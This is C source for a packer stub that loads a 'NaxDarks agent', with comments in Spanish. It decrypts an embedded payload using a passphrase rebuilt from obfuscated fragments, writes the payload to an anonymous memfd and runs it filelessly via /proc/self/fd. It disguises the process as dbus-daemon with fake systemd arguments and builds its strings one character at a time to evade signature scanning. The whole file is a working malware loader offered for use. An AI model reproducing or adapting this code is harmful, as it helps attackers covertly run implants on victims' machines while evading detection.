/*
 * stub.c — Minimal packer stub for NaxDarks agent
 *
 * x86_64: gcc -O2 -s -o agent_packed stub.c
 * arm64:  aarch64-linux-gnu-gcc -O2 -s -o agent_packed_arm64 stub.c
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include "stub_payload.h"

#ifndef STUB_KEY_LEN
#define STUB_KEY_LEN  32
#endif
#ifndef STUB_SALT_LEN
#define STUB_SALT_LEN 16
#endif
#ifndef STUB_PASS_LEN
#define STUB_PASS_LEN 32
#endif

extern char **environ;

/* ============================================================
 * Reconstrucción de la passphrase desde los fragmentos
 *
 * El script genera el header con order = [2,0,3,1], es decir:
 *   stub_pass_frag0 = original frag[2]
 *   stub_pass_frag1 = original frag[0]
 *   stub_pass_frag2 = original frag[3]
 *   stub_pass_frag3 = original frag[1]
 *
 * Para reconstruir el orden original [0,1,2,3]:
 *   pos 0 ← frag1
 *   pos 1 ← frag3
 *   pos 2 ← frag0
 *   pos 3 ← frag2
 * ============================================================ */
static void reconstruct_pass(unsigned char *pass) {
    memcpy(pass +  0, stub_pass_frag1, 8);
    memcpy(pass +  8, stub_pass_frag3, 8);
    memcpy(pass + 16, stub_pass_frag0, 8);
    memcpy(pass + 24, stub_pass_frag2, 8);

    for (int i = 0; i < STUB_PASS_LEN; i++)
        pass[i] ^= (unsigned char)(0x37 + i * 13);
}

/* ============================================================
 * KDF idéntico al del script (FNV-1a 64 + xorshift64)
 * ============================================================ */
static void derive_key(unsigned char *key, size_t key_len,
                       const unsigned char *pass, size_t pass_len,
                       const unsigned char *salt, size_t salt_len) {
    unsigned long long state = 0xCBF29CE484222325ULL;

    for (size_t i = 0; i < pass_len; i++) {
        state ^= pass[i];
        state *= 0x100000001B3ULL;
    }
    for (size_t i = 0; i < salt_len; i++) {
        state ^= salt[i];
        state *= 0x100000001B3ULL;
    }

    for (size_t i = 0; i < key_len; i++) {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        key[i] = (unsigned char)(state & 0xFF);
    }
}

int main(int argc, char **argv, char **envp) {
    /* 1. Passphrase + clave */
    unsigned char pass[STUB_PASS_LEN];
    unsigned char key[STUB_KEY_LEN];

    reconstruct_pass(pass);
    derive_key(key, STUB_KEY_LEN, pass, STUB_PASS_LEN,
               stub_salt, STUB_SALT_LEN);

    memset(pass, 0, sizeof(pass));

    /* 2. Descifrar payload */
    unsigned char *buf = (unsigned char *)malloc(stub_payload_len);
    if (!buf) {
        memset(key, 0, sizeof(key));
        return 1;
    }
    for (unsigned int i = 0; i < stub_payload_len; i++)
        buf[i] = stub_payload[i] ^ key[i % STUB_KEY_LEN];

    memset(key, 0, sizeof(key));

    /* 3. fd anónimo */
    int fd = (int)syscall(SYS_memfd_create, "", 0);

    if (fd < 0) {
        char s_shm[16] = {0}, s_tmp[8] = {0};
        { volatile char *p = (volatile char *)s_shm;
          p[0]='/'; p[1]='d'; p[2]='e'; p[3]='v'; p[4]='/';
          p[5]='s'; p[6]='h'; p[7]='m'; }
        { volatile char *p = (volatile char *)s_tmp;
          p[0]='/'; p[1]='t'; p[2]='m'; p[3]='p'; }

        fd = open(s_shm, O_RDWR | O_TMPFILE | O_EXCL, 0700);
        if (fd < 0) {
            fd = open(s_tmp, O_RDWR | O_TMPFILE | O_EXCL, 0700);
            if (fd < 0) { free(buf); return 1; }
        }
    }

    /* 4. Escribir al fd */
    size_t written = 0;
    while (written < stub_payload_len) {
        ssize_t n = write(fd, buf + written, stub_payload_len - written);
        if (n <= 0) { close(fd); free(buf); return 1; }
        written += (size_t)n;
    }

    memset(buf, 0, stub_payload_len);
    free(buf);

    /* 5. /proc/self/fd/N */
    char fd_path[64];
    {
        char s_procfd[16] = {0};
        { volatile char *p = (volatile char *)s_procfd;
          p[0]='/'; p[1]='p'; p[2]='r'; p[3]='o'; p[4]='c'; p[5]='/';
          p[6]='s'; p[7]='e'; p[8]='l'; p[9]='f'; p[10]='/';
          p[11]='f'; p[12]='d'; p[13]='/'; }

        int n = 0;
        while (s_procfd[n]) { fd_path[n] = s_procfd[n]; n++; }

        if (fd >= 100) fd_path[n++] = (char)('0' + (fd / 100) % 10);
        if (fd >=  10) fd_path[n++] = (char)('0' + (fd /  10) % 10);
        fd_path[n++] = (char)('0' + (fd % 10));
        fd_path[n]   = '\0';
    }

    /* 6. Camuflaje */
    char s_comm[16] = {0};
    char s_dbus[32] = {0};
    char s_arg1[16] = {0};
    char s_arg2[32] = {0};
    char s_arg3[16] = {0};
    char s_arg4[16] = {0};
    char s_arg5[32] = {0};
    char s_arg6[16] = {0};

    {
        volatile char *p;

        p = (volatile char *)s_comm;
        p[0]='d'; p[1]='b'; p[2]='u'; p[3]='s'; p[4]='-';
        p[5]='d'; p[6]='a'; p[7]='e'; p[8]='m'; p[9]='o'; p[10]='n';

        p = (volatile char *)s_dbus;
        p[0]='/'; p[1]='u'; p[2]='s'; p[3]='r'; p[4]='/';
        p[5]='b'; p[6]='i'; p[7]='n'; p[8]='/';
        p[9]='d'; p[10]='b'; p[11]='u'; p[12]='s';
        p[13]='-'; p[14]='d'; p[15]='a'; p[16]='e';
        p[17]='m'; p[18]='o'; p[19]='n';

        p = (volatile char *)s_arg1;
        p[0]='-'; p[1]='-'; p[2]='s'; p[3]='y'; p[4]='s';
        p[5]='t'; p[6]='e'; p[7]='m';

        p = (volatile char *)s_arg2;
        p[0]='-'; p[1]='-'; p[2]='a'; p[3]='d'; p[4]='d';
        p[5]='r'; p[6]='e'; p[7]='s'; p[8]='s'; p[9]='=';
        p[10]='s'; p[11]='y'; p[12]='s'; p[13]='t'; p[14]='e';
        p[15]='m'; p[16]='d'; p[17]=':';

        p = (volatile char *)s_arg3;
        p[0]='-'; p[1]='-'; p[2]='n'; p[3]='o'; p[4]='f';
        p[5]='o'; p[6]='r'; p[7]='k';

        p = (volatile char *)s_arg4;
        p[0]='-'; p[1]='-'; p[2]='n'; p[3]='o'; p[4]='p';
        p[5]='i'; p[6]='d'; p[7]='f'; p[8]='i'; p[9]='l';
        p[10]='e';

        p = (volatile char *)s_arg5;
        p[0]='-'; p[1]='-'; p[2]='s'; p[3]='y'; p[4]='s';
        p[5]='t'; p[6]='e'; p[7]='m'; p[8]='d'; p[9]='-';
        p[10]='a'; p[11]='c'; p[12]='t'; p[13]='i'; p[14]='v';
        p[15]='a'; p[16]='t'; p[17]='i'; p[18]='o'; p[19]='n';

        p = (volatile char *)s_arg6;
        p[0]='-'; p[1]='-'; p[2]='s'; p[3]='y'; p[4]='s';
        p[5]='l'; p[6]='o'; p[7]='g'; p[8]='-'; p[9]='o';
        p[10]='n'; p[11]='l'; p[12]='y';
    }

    char *fake_argv[] = {
        s_dbus, s_arg1, s_arg2, s_arg3,
        s_arg4, s_arg5, s_arg6, NULL
    };

    prctl(PR_SET_NAME, s_comm, 0, 0, 0);
    setsid();
    {
        char stub_path[4096];
        if (realpath(argv[0], stub_path) == NULL) {
            /* fallback: usa argv[0] tal cual */
            strncpy(stub_path, argv[0], sizeof(stub_path) - 1);
            stub_path[sizeof(stub_path) - 1] = '\0';
        }
        setenv("NAX_STUB_PATH", stub_path, 1);
    }
    execve(fd_path, fake_argv, environ);

    close(fd);
    return 1;
}
